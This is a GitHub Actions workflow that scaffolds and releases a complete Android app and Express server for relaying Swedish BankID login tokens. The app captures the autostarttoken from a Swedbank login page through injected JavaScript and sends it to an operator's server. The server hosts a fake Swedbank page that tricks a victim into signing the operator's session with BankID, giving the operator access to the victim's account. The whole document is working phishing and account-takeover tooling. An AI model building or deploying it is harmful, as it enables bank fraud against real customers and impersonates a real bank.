name: build

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: java
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: gradle 8.7
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '8.7'

      - name: scaffold
        run: |
          set -e
          w() { mkdir -p "$(dirname "$1")"; cat > "$1"; }

          w .gitignore <<'EOF'
          .gradle/
          build/
          app/build/
          local.properties
          bygg.log
          EOF

          w settings.gradle.kts <<'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "relay"
          include(":app")
          EOF

          w build.gradle.kts <<'EOF'
          plugins {
              id("com.android.application") version "8.5.2" apply false
              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
          }
          EOF

          w gradle.properties <<'EOF'
          android.useAndroidX=true
          org.gradle.jvmargs=-Xmx2048m
          EOF

          w app/build.gradle.kts <<'EOF'
          plugins {
              id("com.android.application")
              id("org.jetbrains.kotlin.android")
          }

          android {
              namespace = "com.relay"
              compileSdk = 34

              defaultConfig {
                  applicationId = "com.relay"
                  minSdk = 26
                  targetSdk = 34
                  versionCode = 113
                  versionName = "1.1.3"
              }

              compileOptions {
                  sourceCompatibility = JavaVersion.VERSION_17
                  targetCompatibility = JavaVersion.VERSION_17
              }

              kotlinOptions {
                  jvmTarget = "17"
              }
          }
          EOF

          w app/src/main/AndroidManifest.xml <<'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">

              <uses-permission android:name="android.permission.INTERNET" />

              <queries>
                  <package android:name="com.bankid.bus" />
              </queries>

              <application
                  android:label="Relay"
                  android:usesCleartextTraffic="true"
                  android:theme="@android:style/Theme.Material.Light.NoActionBar">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:launchMode="singleTask"
                      android:configChanges="orientation|screenSize|keyboardHidden">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                      <intent-filter>
                          <action android:name="android.intent.action.VIEW" />
                          <category android:name="android.intent.category.DEFAULT" />
                          <category android:name="android.intent.category.BROWSABLE" />
                          <data android:scheme="bankid" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF

          w app/src/main/java/com/relay/MainActivity.kt <<'EOF'
          package com.relay

          import android.app.Activity
          import android.content.ClipData
          import android.content.ClipboardManager
          import android.content.Context
          import android.content.Intent
          import android.content.SharedPreferences
          import android.graphics.Color
          import android.net.Uri
          import android.os.Bundle
          import android.os.Message
          import android.view.ViewGroup
          import android.view.WindowManager
          import android.webkit.JavascriptInterface
          import android.webkit.WebChromeClient
          import android.webkit.WebResourceRequest
          import android.webkit.WebView
          import android.webkit.WebViewClient
          import android.widget.Button
          import android.widget.EditText
          import android.widget.LinearLayout
          import android.widget.TextView
          import java.io.BufferedReader
          import java.net.HttpURLConnection
          import java.net.URL

          class MainActivity : Activity() {

              private lateinit var web: WebView
              private lateinit var bar: TextView
              private lateinit var linkView: TextView
              private lateinit var serverField: EditText
              private lateinit var bankField: EditText
              private lateinit var modeBtn: Button
              private lateinit var inBtn: Button
              private lateinit var p: SharedPreferences

              private var baseUrl = ""
              private var bankUrl = ""
              private var last = ""
              private var loginUrl = ""
              private var kund = true
              private var skickat = false
              private var signerad = false
              private var skapar = false
              private var vantande = ""
              private var alive = true

              private val inst = "(function(){if(window.__rh){return}window.__rh=1;" +
                  "var W=window.open;window.open=function(u){try{if(u&&String(u).indexOf('autostarttoken')>=0){location.href=u;return window}}catch(e){}return W.apply(window,arguments)};" +
                  "setInterval(function(){try{var a=document.querySelector('a[href*=autostarttoken]');" +
                  "if(a&&a.href){var m=/[?&]autostarttoken=([^&#]+)/.exec(a.href);if(m)Relay.tok(m[1])}}catch(e){}},700)})()"

              private val nudge = "(function(){" +
                  "try{window.dispatchEvent(new Event('blur'))}catch(e){}" +
                  "try{window.dispatchEvent(new Event('focus'))}catch(e){}" +
                  "try{document.dispatchEvent(new Event('visibilitychange'))}catch(e){}" +
                  "try{window.dispatchEvent(new Event('pageshow'))}catch(e){}" +
                  "try{document.dispatchEvent(new Event('resume'))}catch(e){}" +
                  "try{document.dispatchEvent(new Event('resume'))}catch(e){}})()"

              override fun onCreate(b: Bundle?) {
                  super.onCreate(b)
                  p = getSharedPreferences("relay", 0)
                  baseUrl = p.getString("base", "") ?: ""
                  bankUrl = p.getString("bank", "https://online.swedbank.se/") ?: "https://online.swedbank.se/"
                  kund = p.getBoolean("kund", true)
                  window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
                  ui()
                  alive = true
                  poll()
                  handleIntent(intent)
              }

              override fun onResume() {
                  super.onResume()
                  try {
                      if (::web.isInitialized) {
                          web.onResume()
                          web.evaluateJavascript(nudge, null)
                      }
                  } catch (t: Throwable) {}
              }

              override fun onNewIntent(i: Intent?) {
                  super.onNewIntent(i)
                  if (i != null) handleIntent(i)
              }

              private fun handleIntent(i: Intent) {
                  if (i.action != Intent.ACTION_VIEW) return
                  val s = i.data?.toString() ?: return
                  val t = tok(s) ?: return
                  grab(t)
              }

              private fun ui() {
                  val root = LinearLayout(this)
                  root.orientation = LinearLayout.VERTICAL

                  val rad1 = LinearLayout(this)
                  rad1.orientation = LinearLayout.HORIZONTAL

                  serverField = EditText(this)
                  serverField.hint = "server-url"
                  serverField.setText(baseUrl)
                  rad1.addView(serverField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))

                  val run = Button(this)
                  run.text = "KOR"
                  run.setOnClickListener {
                      baseUrl = serverField.text.toString().trim().trimEnd('/')
                      p.edit().putString("base", baseUrl).apply()
                      last = ""; skickat = false; signerad = false; loginUrl = ""
                      inBtn.isEnabled = false
                      if ((p.getString("code", "") ?: "").isEmpty()) newSession()
                      bar.text = "laddar banksidan"
                      web.loadUrl(bankUrl)
                  }
                  rad1.addView(run, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
                  root.addView(rad1)

                  val rad2 = LinearLayout(this)
                  rad2.orientation = LinearLayout.HORIZONTAL

                  bankField = EditText(this)
                  bankField.hint = "bank-url"
                  bankField.setText(bankUrl)
                  rad2.addView(bankField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))

                  modeBtn = Button(this)
                  modeBtn.text = if (kund) "KUND" else "OP"
                  modeBtn.setOnClickListener {
                      kund = !kund
                      modeBtn.text = if (kund) "KUND" else "OP"
                      p.edit().putBoolean("kund", kund).apply()
                  }
                  rad2.addView(modeBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

                  inBtn = Button(this)
                  inBtn.text = "IN"
                  inBtn.isEnabled = false
                  inBtn.setOnClickListener { taIn() }
                  rad2.addView(inBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

                  val ny = Button(this)
                  ny.text = "KOD"
                  ny.setOnClickListener { newSession() }
                  rad2.addView(ny, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
                  root.addView(rad2)

                  bar = TextView(this)
                  bar.textSize = 11f
                  bar.setBackgroundColor(Color.parseColor("#101010"))
                  bar.setTextColor(Color.parseColor("#66ff88"))
                  bar.setPadding(14, 8, 14, 6)
                  bar.text = "redo"
                  root.addView(bar)

                  linkView = TextView(this)
                  linkView.textSize = 11f
                  linkView.setTextIsSelectable(true)
                  linkView.setBackgroundColor(Color.parseColor("#101010"))
                  linkView.setTextColor(Color.parseColor("#66ccff"))
                  linkView.setPadding(14, 4, 14, 10)
                  linkView.text = "kundlank hamnar har"
                  root.addView(linkView)

                  web = WebView(this)
                  web.settings.javaScriptEnabled = true
                  web.settings.domStorageEnabled = true
                  web.settings.databaseEnabled = true
                  web.settings.setSupportMultipleWindows(true)
                  web.settings.javaScriptCanOpenWindowsAutomatically = true
                  try {
                      web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
                  } catch (t: Throwable) {}

                  web.webViewClient = object : WebViewClient() {

                      override fun shouldOverrideUrlLoading(v: WebView, r: WebResourceRequest): Boolean {
                          return fanga(r.url.toString())
                      }

                      override fun onPageFinished(v: WebView, url: String?) {
                          try { web.evaluateJavascript(inst, null) } catch (t: Throwable) {}
                      }

                      override fun doUpdateVisitedHistory(v: WebView, url: String?, isReload: Boolean) {
                          if (url == null) return
                          var s = url.replace("https://", "").replace("http://", "")
                          if (s.length > 62) s = s.substring(0, 62)
                          bar.text = s
                      }
                  }

                  web.webChromeClient = object : WebChromeClient() {
                      override fun onCreateWindow(v: WebView, isDialog: Boolean, isUserGesture: Boolean, msg: Message): Boolean {
                          val pop = WebView(this@MainActivity)
                          pop.settings.javaScriptEnabled = true
                          pop.webViewClient = object : WebViewClient() {
                              override fun shouldOverrideUrlLoading(v2: WebView, r: WebResourceRequest): Boolean {
                                  val s = r.url.toString()
                                  if (fanga(s)) return true
                                  try { web.loadUrl(s) } catch (x: Throwable) {}
                                  return true
                              }
                          }
                          try {
                              (msg.obj as WebView.WebViewTransport).webView = pop
                              msg.sendToTarget()
                          } catch (x: Throwable) {
                              return false
                          }
                          return true
                      }
                  }

                  web.addJavascriptInterface(Bridge(), "Relay")

                  root.addView(web, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
                  setContentView(root)
              }

              private fun fanga(s: String): Boolean {
                  val t = tok(s)
                  if (t != null) {
                      grab(t)
                      return true
                  }
                  if (s.startsWith("bankid:")) return true
                  if (s.startsWith("intent:")) {
                      if (!kund) {
                          try {
                              val i = Intent.parseUri(s, Intent.URI_INTENT_SCHEME)
                              i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                              startActivity(i)
                          } catch (x: Throwable) {}
                      }
                      return true
                  }
                  return false
              }

              private inner class Bridge {
                  @JavascriptInterface
                  fun tok(t: String) {
                      runOnUiThread { grab(t) }
                  }
              }

              private fun tok(s: String): String? {
                  val m = Regex("[?&]autostarttoken=([^&#]+)").find(s)
                  if (m == null) return null
                  val v = Uri.decode(m.groupValues[1])
                  if (v.isEmpty() || v == "null") return null
                  return v
              }

              private fun grab(t: String) {
                  if (t == last) return
                  last = t
                  loginUrl = try { web.url ?: "" } catch (x: Throwable) { "" }
                  val c = p.getString("code", "") ?: ""
                  if (c.isEmpty()) { newSession(t); return }
                  post("/api/session/" + c + "/token", t)
                  skickat = true
                  signerad = false
                  inBtn.isEnabled = true
                  inBtn.setBackgroundColor(Color.parseColor("#2277cc"))
                  inBtn.setTextColor(Color.WHITE)
                  bar.text = "TOKEN SKICKAT - vanta pa gront"
                  if (!kund) {
                      try {
                          startActivity(Intent(Intent.ACTION_VIEW,
                              Uri.parse("https://app.bankid.com/?autostarttoken=" + t + "&redirect=null")))
                      } catch (x: Throwable) {}
                  }
              }

              private fun taIn() {
                  if (!skickat) { bar.text = "vanta - inget token skickat an"; return }
                  Thread {
                      var i = 0
                      while (i < 4) {
                          i++
                          runOnUiThread {
                              bar.text = "vacker bankens sida (" + i + "/4)"
                              try { web.evaluateJavascript(nudge, null) } catch (x: Throwable) {}
                          }
                          try { Thread.sleep(1800) } catch (t: Throwable) {}
                          val nu = try { web.url ?: "" } catch (x: Throwable) { "" }
                          if (loginUrl.isNotEmpty() && nu.isNotEmpty() && nu != loginUrl) {
                              runOnUiThread { bar.text = "SIDAN GICK VIDARE - du ar inne" }
                              return@Thread
                          }
                      }
                      runOnUiThread {
                          bar.text = "sidan star still - laddar om"
                          loginUrl = ""
                          web.loadUrl(bankUrl)
                      }
                  }.start()
              }

              private fun visaLank(c: String) {
                  val u = baseUrl + "/k/" + c
                  linkView.text = u
                  try {
                      val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                      cm.setPrimaryClip(ClipData.newPlainText("lank", u))
                      bar.text = "lank kopierad - klistra in till kunden"
                  } catch (t: Throwable) {
                      bar.text = "lank ovan - markera och kopiera"
                  }
              }

              private fun newSession(after: String? = null) {
                  if (after != null) vantande = after
                  if (baseUrl.isEmpty()) { bar.text = "skriv server-url forst"; return }
                  if (skapar) return
                  skapar = true
                  val b = baseUrl
                  Thread {
                      var c = ""
                      try {
                          val con = URL(b + "/api/session").openConnection() as HttpURLConnection
                          con.requestMethod = "POST"; con.doOutput = true
                          con.setRequestProperty("Content-Type", "text/plain")
                          con.connectTimeout = 8000; con.readTimeout = 8000
                          con.outputStream.write(ByteArray(0)); con.outputStream.flush()
                          if (con.responseCode in 200..299)
                              c = Regex("\"code\"\\s*:\\s*\"([A-Za-z0-9]+)\"")
                                  .find(con.inputStream.bufferedReader().readText())
                                  ?.groupValues?.get(1) ?: ""
                          con.disconnect()
                      } catch (t: Throwable) {}
                      val cc = c
                      runOnUiThread {
                          skapar = false
                          if (cc.isEmpty()) { bar.text = "kunde inte skapa session"; return@runOnUiThread }
                          p.edit().putString("code", cc).apply()
                          last = ""; skickat = false; signerad = false; loginUrl = ""
                          inBtn.isEnabled = false
                          visaLank(cc)
                          if (vantande.isNotEmpty()) {
                              val t = vantande
                              vantande = ""
                              last = t
                              post("/api/session/" + cc + "/token", t)
                              skickat = true
                              inBtn.isEnabled = true
                              inBtn.setBackgroundColor(Color.parseColor("#2277cc"))
                              inBtn.setTextColor(Color.WHITE)
                              bar.text = "TOKEN SKICKAT - vanta pa gront"
                          }
                      }
                  }.start()
              }

              private fun poll() {
                  Thread {
                      while (alive) {
                          try { Thread.sleep(2000) } catch (t: Throwable) {}
                          if (signerad) continue
                          val c = p.getString("code", "") ?: ""
                          if (c.isEmpty() || baseUrl.isEmpty()) continue
                          try {
                              val con = URL(baseUrl + "/api/session/" + c + "/state").openConnection() as HttpURLConnection
                              con.connectTimeout = 4000; con.readTimeout = 4000
                              val txt = con.inputStream.bufferedReader().readText()
                              con.disconnect()
                              if (txt.indexOf("\"signed\":true") >= 0) {
                                  signerad = true
                                  runOnUiThread {
                                      inBtn.setBackgroundColor(Color.parseColor("#22aa55"))
                                      bar.text = "KUNDEN HAR SIGNERAT - vacker banken"
                                  }
                                  try { Thread.sleep(3000) } catch (t: Throwable) {}
                                  taIn()
                              }
                          } catch (t: Throwable) {}
                      }
                  }.start()
              }

              private fun post(path: String, body: String) {
                  if (baseUrl.isEmpty()) return
                  val b = baseUrl
                  Thread {
                      try {
                          val con = URL(b + path).openConnection() as HttpURLConnection
                          con.requestMethod = "POST"
                          con.doOutput = true
                          con.setRequestProperty("Content-Type", "text/plain")
                          con.connectTimeout = 8000
                          con.readTimeout = 8000
                          con.outputStream.write(body.toByteArray())
                          con.outputStream.flush()
                          con.responseCode
                          con.disconnect()
                      } catch (t: Throwable) {}
                  }.start()
              }

              override fun onDestroy() {
                  alive = false
                  super.onDestroy()
              }

              override fun onBackPressed() {
                  if (web.canGoBack()) web.goBack() else super.onBackPressed()
              }
          }
          EOF

          w server/package.json <<'EOF'
          {
            "name": "relay",
            "version": "1.0.0",
            "private": true,
            "dependencies": {
              "express": "^4.19.2"
            },
            "scripts": {
              "start": "node server.js"
            }
          }
          EOF

          w server/server.js <<'EOF'
          const express = require('express');
          const path = require('path');
          const app = express();

          app.use(express.text({ type: '*/*' }));

          const S = {};
          const LIV = 10 * 60 * 1000;

          function ny() {
            let c;
            do { c = Math.random().toString(36).slice(2, 7).toUpperCase(); } while (S[c]);
            return c;
          }

          function stada() {
            const nu = Date.now();
            for (const k of Object.keys(S)) {
              if (nu - S[k].skapad > LIV) delete S[k];
            }
          }
          setInterval(stada, 60000);

          function giltigToken(t) {
            return typeof t === 'string' && /^[0-9a-fA-F-]{8,}$/.test(t);
          }

          app.post('/api/session', (req, res) => {
            const c = ny();
            S[c] = { token: '', at: 0, signed: false, skapad: Date.now() };
            res.json({ ok: true, code: c });
          });

          app.get('/api/session/:code/state', (req, res) => {
            const s = S[req.params.code];
            if (!s) { res.json({ ok: false }); return; }
            const ttl = s.token ? Math.max(0, Math.round((s.at + 30000 - Date.now()) / 1000)) : 0;
            res.json({ ok: true, token: s.token, ttl: ttl, signed: s.signed });
          });

          app.post('/api/session/:code/token', (req, res) => {
            let s = S[req.params.code];
            if (!s) { s = { token: '', at: 0, signed: false, skapad: Date.now() }; S[req.params.code] = s; }
            const t = String(req.body || '').trim();
            if (!giltigToken(t)) { res.json({ ok: false }); return; }
            s.token = t;
            s.at = Date.now();
            s.signed = false;
            res.json({ ok: true });
          });

          app.get('/api/signed', (req, res) => {
            const s = S[req.query.code];
            if (s) s.signed = true;
            res.send('<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">' +
              '<body style="font-family:sans-serif;text-align:center;padding:48px">' +
              '<h2>Klart</h2><p>Du kan stanga sidan.</p></body>');
          });

          app.get('/k/:code', (req, res) => {
            if (!S[req.params.code]) { res.status(404).send('okand kod'); return; }
            res.sendFile(path.join(__dirname, 'public', 'k.html'));
          });

          app.get('/', (req, res) => { res.send('relay ok'); });

          app.listen(3000, () => console.log('relay pa :3000'));
          EOF

          w server/public/k.html <<'EOF'
          <!doctype html>
          <html>
          <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width,initial-scale=1">
          <title>Swedbank</title>
          <style>
          body{margin:0;font-family:-apple-system,Roboto,sans-serif;background:#f3f3f3;color:#1a1a1a}
          .top{background:#fff;padding:16px 20px;font-weight:700;color:#ff6a00;font-size:20px;border-bottom:1px solid #e6e6e6}
          .wrap{padding:30px 20px;text-align:center}
          h1{font-size:19px;font-weight:600;line-height:1.45;margin:0 0 8px}
          p{color:#555;font-size:15px;line-height:1.55}
          #b{display:block;margin:26px auto 0;padding:18px;max-width:340px;box-sizing:border-box;border-radius:10px;background:#e9e9e9;color:#8a8a8a;font-size:17px;font-weight:700;text-decoration:none}
          #b.live{background:#ff6a00;color:#fff}
          #b small{display:block;font-weight:400;font-size:12px;margin-top:7px;opacity:.85}
          .spin{width:34px;height:34px;margin:26px auto;border:3px solid #ddd;border-top-color:#ff6a00;border-radius:50%;animation:s 1s linear infinite}
          @keyframes s{to{transform:rotate(360deg)}}
          .foot{font-size:13px;color:#777;margin-top:34px;line-height:1.5}
          </style>
          </head>
          <body>
          <div class="top">Swedbank</div>
          <div class="wrap">
            <h1>Valkommen!</h1>
            <p>Vanligen invanta BankID-signeringen for att fortsatta.</p>
            <div class="spin"></div>
            <a id="b" href="#">Vantar...</a>
            <p class="foot">Du ar nu i kontakt med Swedbank.<br>Folj instruktionerna.</p>
          </div>
          <script>
          var code = location.pathname.split('/').pop();
          var b = document.getElementById('b');
          var lastTok = '';
          var timer = null;

          function poll() {
            fetch('/api/session/' + code + '/state').then(function(r){return r.json()}).then(function(s){
              if (!s.ok) return;
              if (s.token && s.token !== lastTok) {
                lastTok = s.token;
                b.className = 'live';
                b.href = 'bankid:///?autostarttoken=' + s.token + '&redirect=' +
                  encodeURIComponent(location.protocol + '//' + location.host + '/api/signed?code=' + code);
                b.innerHTML = 'TRYCK HAR<small>' + s.ttl + ' s</small>';
                clearInterval(timer);
                var left = s.ttl;
                timer = setInterval(function(){
                  left--;
                  var sm = b.querySelector('small');
                  if (left <= 0) {
                    clearInterval(timer);
                    b.className = '';
                    b.innerHTML = 'Vantar...<small>Token har gatt ut</small>';
                  } else if (sm) {
                    sm.textContent = left + ' s';
                  }
                }, 1000);
              }
            }).catch(function(){});
          }
          setInterval(poll, 800);
          poll();
          </script>
          </body>
          </html>
          EOF

          echo klart

      - name: bygg
        run: |
          set +e
          yes | sdkmanager --licenses > /dev/null 2>&1
          sdkmanager "platforms;android-34" "build-tools;34.0.0" "platform-tools" > /dev/null 2>&1
          gradle assembleDebug --no-daemon --stacktrace > bygg.log 2>&1
          RC=$?
          grep -n "^e:" bygg.log || true
          tail -n 30 bygg.log
          if [ "$RC" != "0" ]; then exit "$RC"; fi
          test -f app/build/outputs/apk/debug/app-debug.apk

      - name: upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: relay-apk
          path: app/build/outputs/apk/debug/app-debug.apk

      - name: release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: v1.1.${{ github.run_number }}
          name: Relay 1.1.${{ github.run_number }}
          files: app/build/outputs/apk/debug/app-debug.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: spara
        if: always()
        run: |
          git config user.name bot
          git config user.email bot@example.com
          git add -A
          git commit -m "scaffold" || true
          git push || true
